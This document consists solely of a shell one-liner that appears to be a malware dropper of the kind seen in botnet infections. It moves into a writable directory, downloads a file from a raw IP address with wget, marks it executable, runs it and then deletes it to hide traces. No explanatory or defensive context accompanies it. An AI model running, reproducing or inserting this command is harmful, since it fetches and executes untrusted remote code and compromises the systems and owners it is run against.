cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://173.0.51.12/' '; chmod +x ' '; ./' '; rm -rf ' '
